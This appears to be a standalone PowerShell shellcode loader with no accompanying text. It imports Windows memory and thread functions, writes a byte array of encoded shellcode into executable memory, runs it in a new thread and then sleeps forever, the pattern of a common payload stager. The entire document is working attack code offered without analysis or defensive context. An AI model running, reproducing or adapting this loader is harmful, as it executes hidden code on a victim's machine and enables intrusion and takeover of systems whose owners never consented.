
$59c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $59c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc0,0xb8,0xcd,0x54,0x6f,0xd0,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0xc9,0xb6,0x9a,0x2c,0x39,0xb4,0x65,0xcd,0xb9,0xd9,0xec,0x28,0x88,0xd9,0x8b,0x39,0xba,0xe9,0xd8,0x6c,0x36,0x81,0x8d,0x84,0xcd,0xe7,0x19,0xaa,0x66,0x4d,0x7c,0x85,0x77,0xfe,0xbc,0x84,0xfb,0xfd,0x90,0x66,0xc2,0xcd,0xe4,0x67,0x03,0x33,0x04,0x35,0xdc,0x3f,0xbb,0xaa,0x69,0x75,0x00,0x40,0x21,0x9b,0x00,0xb5,0xf1,0x9a,0x21,0x68,0x8a,0xc4,0xe1,0x8a,0x5f,0x7d,0xa8,0x94,0xbc,0xb8,0x62,0x2e,0x76,0x36,0x75,0xe6,0x47,0xb7,0xda,0xc7,0x68,0x4a,0x22,0x0f,0x4e,0xb5,0x51,0x79,0xad,0x48,0x62,0xbe,0xcc,0x96,0xe7,0x25,0x76,0x5c,0x5f,0x82,0x87,0xb1,0x06,0x41,0x8b,0x7e,0x4c,0x0d,0x8f,0x81,0x81,0x25,0xab,0x0a,0x24,0xea,0x3a,0x48,0x03,0x2e,0x67,0x0a,0x2a,0x77,0xcd,0xfd,0x53,0x67,0xae,0xa2,0xf1,0xe3,0x42,0xb6,0x8b,0xa9,0x0a,0x7b,0xa6,0x51,0xca,0x13,0xb1,0x22,0xf8,0xbc,0x69,0xad,0xb0,0x35,0xb4,0x2a,0xb7,0x6f,0x00,0xa4,0x46,0x90,0x71,0xec,0x8c,0xc4,0x21,0x86,0x25,0x65,0xaa,0x56,0xca,0xb0,0x47,0x52,0x5c,0x31,0x98,0x5e,0x93,0x2d,0x9a,0x5e,0xb4,0x3d,0x13,0xb8,0x9a,0x6d,0x74,0x15,0x5a,0xde,0x34,0xc5,0x32,0x34,0xbb,0x3a,0x22,0x37,0x11,0x53,0xc8,0xd8,0xcc,0x0b,0x64,0x40,0x55,0xc7,0x15,0x8d,0x43,0xad,0x15,0x05,0x60,0x51,0xdb,0xee,0x0d,0x41,0x8b,0x1e,0x58,0x3b,0x1d,0x20,0x76,0x56,0xa1,0xb4,0x7d,0xf1,0xf6,0x20,0x7c,0x24,0x30,0xef,0x7f,0x03,0x4b,0x26,0xea,0xec,0x23,0x47,0xfa,0xec,0xb3,0x11,0x90,0xec,0xdb,0xc5,0xc0,0xbe,0xfe,0x09,0xdd,0xd2,0x53,0x9c,0xde,0x82,0x00,0x37,0xb7,0x28,0x7f,0x7f,0x18,0xd2,0xaa,0x81,0x64,0x05,0x92,0xf7,0x84,0x95;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$LaBz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($LaBz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$LaBz,0,0,0);for (;;){Start-sleep 60};

